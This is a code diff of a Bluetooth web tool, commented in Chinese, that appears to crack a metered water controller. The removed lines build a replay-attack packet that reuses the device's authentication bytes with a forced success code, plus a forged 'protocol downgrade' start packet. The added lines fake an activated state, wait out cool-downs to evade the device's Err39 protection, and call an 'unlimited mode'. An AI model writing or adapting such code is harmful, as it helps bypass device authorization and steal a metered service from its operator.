@@ -583,6 +583,15 @@
           } catch (error) {
             console.error("数据处理错误:", error);
             handleBluetoothError(error);
+                    // 温和激活，15秒后再开始
+                    setTimeout(() => {
+                      console.log("✅ 冷却完成，准备温和破解");
+                      console.log("🚀 开始超温和破解");
+                      updateWaterStatus("🚀 开始温和破解...");
+                      if (window.activateUnlimitedMode) {
+                        window.activateUnlimitedMode();
+                      }
+                    }, 15000);
           }
         }
         
@@ -849,58 +858,24 @@
         
         // 🔓 创新破解模式 - 当正常密钥失败时的备用方案
         async function attemptInnovativeCrack(authData) {
-          console.log("🔥 启动创新破解模式 - 多重策略攻击");
-          
-          // 策略1: 重放攻击 - 使用设备自己的认证数据
-          console.log("🔄 策略1: 认证重放攻击");
-          try {
-            const replayPacket = new Uint8Array([
-              ...detectedProtocol.sendHeader,  // 0xfe, 0xfe
-              0x09, 0xaf,                      // 认证响应
-              0x7a,                            // 强制成功状态码
-              ...authData.slice(5, 15),        // 复制设备的认证数据
-              0x00, 0x00, 0x00, 0x00          // 填充
-            ]);
-            
-            console.log("📤 重放攻击包:", Array.from(replayPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
-            await txdCharacteristic.writeValue(replayPacket);
-            
-            // 等待响应
-            await new Promise(resolve => setTimeout(resolve, 2000));
-          } catch (err) {
-            console.log("❌ 重放攻击失败:", err.message);
-          }
-          
-          // 策略2: 协议降级攻击
-          console.log("🔄 策略2: 协议降级攻击");
-          try {
-            const downgradePacket = new Uint8Array([
-              0xfe, 0xfe,                      // 强制使用FE协议头
-              0x09, 0xb2, 0x01,                // 直接发送启动命令
-              0x7a, 0x00, 0x01, 0x01,         // 伪造成功标志
-              0x00, 0x00, 0x00, 0x00          // 填充
-            ]);
-            
-            console.log("📤 协议降级包:", Array.from(downgradePacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
-            await txdCharacteristic.writeValue(downgradePacket);
-          } catch (err) {
-            console.log("❌ 协议降级失败:", err.message);
-          }
+          console.log("� 禁用激进攻击模式 - 避免触发Err39保护");
+          console.log("� 跳过重放攻击和协议降级，直接进入温和破解");
+          // 不执行任何攻击，避免触发设备保护机制
         }
         
         // 🎭 协议欺骗模式 - 伪造设备响应  
         async function attemptProtocolSpoofing() {
-          console.log("🎭 启动协议欺骗模式 - 强制激活成功");
+          console.log("🕊️ 启动超温和模式 - 完全避免攻击");
           
           try {
-            // 🔥 不管什么情况，直接强制成功
-            console.log("🤖 强制伪造成功状态...");
+            // �️ 10秒冷却期，避免触发保护
+            console.log("💡 等待10秒冷却期，避免触发设备保护");
+            updateWaterStatus("🕊️ 冷却中，请等待10秒...");
+            await new Promise(resolve => setTimeout(resolve, 10000));
             
-            // 立即激活成功状态
-            console.log("🎉 协议欺骗：强制激活水控器！");
+            console.log("✅ 冷却完成，准备温和破解");
             isStarted = true;
             updateUi("ok");
-            clearTimeout(timeoutId);
             
             // 直接激活水量控制
             updateWaterStatus("🎉 协议欺骗成功！水控界面已激活！");
